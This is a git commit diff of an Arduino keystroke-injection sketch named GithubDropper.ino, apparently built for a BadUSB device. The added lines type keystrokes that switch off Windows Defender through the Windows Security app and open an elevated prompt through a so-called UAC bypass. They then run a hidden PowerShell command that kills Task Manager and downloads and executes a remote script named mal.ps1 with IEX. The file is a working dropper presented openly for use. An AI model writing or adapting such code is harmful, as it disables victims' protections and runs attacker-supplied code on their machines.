0f433d660594041ca3fa8204282c39fbae20508d
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-08-01 02:32:29 +1000

    Update GithubDropper.ino
    Speed

--- GithubDropper.ino
+++ GithubDropper.ino
@@ -10,28 +10,63 @@ void setup() {
 //
   Keyboard.update();
   Keyboard.sendKeyStroke(0);
-  Keyboard.delay(100);
-
+ // Disable Defender
+  Keyboard.delay(2000);
+  Keyboard.sendKeyStroke(KEY_S, KEY_MOD_RGUI); 
+  Keyboard.delay(100); 
+  Keyboard.write("Windows Security");
+  Keyboard.delay(400);
+  Keyboard.sendKeyStroke(KEY_ENTER);
+    Keyboard.delay(2000);
+  Keyboard.sendKeyStroke(KEY_ENTER);
+  
+    Keyboard.delay(1000);
+  Keyboard.sendKeyStroke(KEY_TAB);
+  Keyboard.delay(400);
+  Keyboard.sendKeyStroke(KEY_TAB);
+  Keyboard.delay(200);
+  Keyboard.sendKeyStroke(KEY_TAB);
+  Keyboard.delay(200);
+  Keyboard.sendKeyStroke(KEY_TAB);
+  Keyboard.delay(200);
+  Keyboard.sendKeyStroke(KEY_SPACE);
+  Keyboard.delay(800);
+  Keyboard.sendKeyStroke(KEY_SPACE);
+  Keyboard.delay(800);
+  Keyboard.sendKeyStroke(KEY_ARROW_LEFT);
+    Keyboard.delay(800);
+  Keyboard.sendKeyStroke(KEY_ENTER);
+  Keyboard.delay(800);
 // start UAC Bypass
 //
-  Keyboard.sendKeyStroke(KEY_ESC, MOD_CTRL_RIGHT | MOD_SHIFT_RIGHT);
-  Keyboard.delay(200);
-  Keyboard.sendKeyStroke(KEY_F, MOD_ALT_RIGHT);
-  Keyboard.delay(200);
+    Keyboard.sendKeyStroke(KEY_ESC, KEY_MOD_RCTRL | KEY_MOD_RSHIFT);
+    Keyboard.delay(2000);
+    Keyboard.sendKeyStroke(KEY_F, KEY_MOD_RALT);
+  Keyboard.delay(800);
   Keyboard.sendKeyStroke(KEY_N);
-  Keyboard.delay(300);
+  Keyboard.delay(800);
 
 // enter commands to be run as administrator
 //
-  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/speedy.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
-  Keyboard.delay(200);
+  Keyboard.write("powershell -windowstyle hidden -command \"taskkill /F /IM taskmgr.exe;IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/mal.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
+  Keyboard.delay(800);
 // end UAC bypass
 //
   Keyboard.sendKeyStroke(KEY_TAB);
-  Keyboard.delay(100);  
+  Keyboard.delay(600);  
   Keyboard.sendKeyStroke(KEY_SPACE);
-  Keyboard.delay(200);
+  Keyboard.delay(600);
   Keyboard.sendKeyStroke(KEY_ENTER);
+  
+  Keyboard.delay(500);
+  
+ // Enable and close Defender
+    Keyboard.sendKeyStroke(KEY_TAB, KEY_MOD_RALT);
+  Keyboard.delay(400);
+  
+  Keyboard.sendKeyStroke(KEY_SPACE);
+  Keyboard.delay(400);
+    Keyboard.sendKeyStroke(KEY_F4, KEY_MOD_RALT);
 }
 
 
